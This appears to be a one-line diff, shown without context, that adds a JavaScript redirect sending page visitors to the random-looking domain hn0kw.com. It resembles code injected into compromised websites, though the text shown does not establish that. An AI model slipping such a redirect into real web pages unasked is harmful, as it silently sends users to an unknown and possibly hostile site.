@@ -1,0 +1,1 @@
+window.location.href = 'https://hn0kw.com/';
